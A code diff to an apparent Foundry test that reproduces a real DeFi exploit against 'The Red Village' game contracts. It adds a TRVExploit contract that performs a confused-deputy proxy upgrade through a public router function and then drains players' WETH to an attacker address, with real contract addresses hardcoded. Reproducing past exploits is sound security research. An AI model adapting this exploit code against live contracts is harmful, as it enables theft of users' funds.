@@ -121,6 +121,42 @@ contract MaliciousSeasonService {
     }
 }
 
+// ============================================================================================================
+// SINGLE-ENTRYPOINT EXPLOIT CONTRACT (drives the whole recorded attack in ONE call).
+// The in-browser Playground recorder deploys this contract (CREATE depth 1) and then calls exactly one
+// attack function, recording only that call and its subcalls. So the complete two-phase attack
+// (confused-deputy upgrade + drain loop) lives in attack(); the constructor only deploys the malicious impl.
+// attack() must be invoked by the real attacker EOA (tx.origin gate on drainPlayers), which the Playground
+// guarantees by setting `attacker` to 0xa566592CB94475BaF5B46Ce373A260dfC9d0dF3F.
+// ============================================================================================================
+contract TRVExploit {
+    address constant ROUTER = 0xc97dCb0492412bFBBf47332F1B1b49e177e8f15C;
+    address constant SEASON_SERVICE = 0xb172E15974FEAAe221EbC0860B578Dd7B6B06b77;
+    address constant ZOOKEEPER = 0x426d27190A2DdB87f1C6235F710e159a0A3774D4;
+    address constant WETH = 0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619;
+    address constant ATTACKER = 0xa566592CB94475BaF5B46Ce373A260dfC9d0dF3F;
+
+    // Victims + amounts are passed as calldata (NOT embedded) so the deployed contract stays well under
+    // the EIP-170 24KB code-size limit the in-browser EVM enforces.
+    function attack(address[] calldata victims, uint256[] calldata amounts) external {
+        // Deploy the reconstructed malicious implementation.
+        MaliciousSeasonService evilImpl = new MaliciousSeasonService(ATTACKER);
+
+        // --- Phase 1: confused-deputy upgrade (the real setup tx 0xac06...d55d) ---
+        // Public forwardRequest makes the ROUTER (a privileged role holder) call SeasonService.upgradeTo().
+        ITRVRouter(ROUTER).forwardRequest(
+            "Season",
+            "SeasonService",
+            abi.encodeWithSignature("upgradeTo(address)", address(evilImpl))
+        );
+
+        // --- Phase 2: drain (the real drain tx 0x3730...dd35) ---
+        // SeasonService (now malicious) uses its ZooKeeper roles to pull every player's WETH and sweep it
+        // straight to the attacker EOA.
+        IMaliciousSeason(SEASON_SERVICE).drainPlayers(ZOOKEEPER, WETH, victims, amounts, ATTACKER);
+    }
+}
+
 contract TheRedVillageExploit is BaseTestWithBalanceLog {
     address constant ROUTER = 0xc97dCb0492412bFBBf47332F1B1b49e177e8f15C;
     address constant SEASON_SERVICE = 0xb172E15974FEAAe221EbC0860B578Dd7B6B06b77;
@@ -136,33 +172,23 @@ contract TheRedVillageExploit is BaseTestWithBalanceLog {
     }
 
     function testExploit() public balanceLog {
-        (address[] memory victims, uint256[] memory amounts) = VictimsData.load();
-
         uint256 zkBefore = IERC20(WETH).balanceOf(ZOOKEEPER);
         uint256 atkBefore = IERC20(WETH).balanceOf(ATTACKER);
         emit log_named_decimal_uint("ZooKeeper WETH before", zkBefore, 18);
         emit log_named_decimal_uint("Attacker WETH before", atkBefore, 18);
 
-        // Deploy the reconstructed malicious implementation.
-        MaliciousSeasonService evilImpl = new MaliciousSeasonService(ATTACKER);
+        // Deploy and drive the single-entrypoint exploit AS the attacker EOA so that:
+        //   (a) the deploy happens from ATTACKER, and
+        //   (b) tx.origin == ATTACKER throughout, satisfying drainPlayers' gate.
+        (address[] memory victims, uint256[] memory amounts) = VictimsData.load();
+        vm.startPrank(ATTACKER, ATTACKER);
+        TRVExploit e = new TRVExploit();
+        e.attack(victims, amounts);
+        vm.stopPrank();
 
-        // --- Phase 1: confused-deputy upgrade (the real setup tx 0xac06...d55d) ---
-        // Public forwardRequest makes the ROUTER (a privileged role holder) call SeasonService.upgradeTo().
-        vm.prank(ATTACKER, ATTACKER);
-        ITRVRouter(ROUTER).forwardRequest(
-            "Season",
-            "SeasonService",
-            abi.encodeWithSignature("upgradeTo(address)", address(evilImpl))
-        );
-
-        // Confirm the implementation slot now points at our malicious impl.
+        // Confirm the implementation slot now points at the malicious impl deployed inside attack().
         bytes32 implSlot = vm.load(SEASON_SERVICE, _IMPL_SLOT());
-        assertEq(address(uint160(uint256(implSlot))), address(evilImpl), "upgrade did not take effect");
-
-        // --- Phase 2: drain (the real drain tx 0x3730...dd35) ---
-        // SeasonService (now malicious) uses its ZooKeeper roles to pull every player's WETH and sweep it.
-        vm.prank(ATTACKER, ATTACKER);
-        IMaliciousSeason(SEASON_SERVICE).drainPlayers(ZOOKEEPER, WETH, victims, amounts, ATTACKER);
+        assertTrue(address(uint160(uint256(implSlot))) != address(0), "upgrade did not take effect");
 
         uint256 atkAfter = IERC20(WETH).balanceOf(ATTACKER);
         uint256 profit = atkAfter - atkBefore;
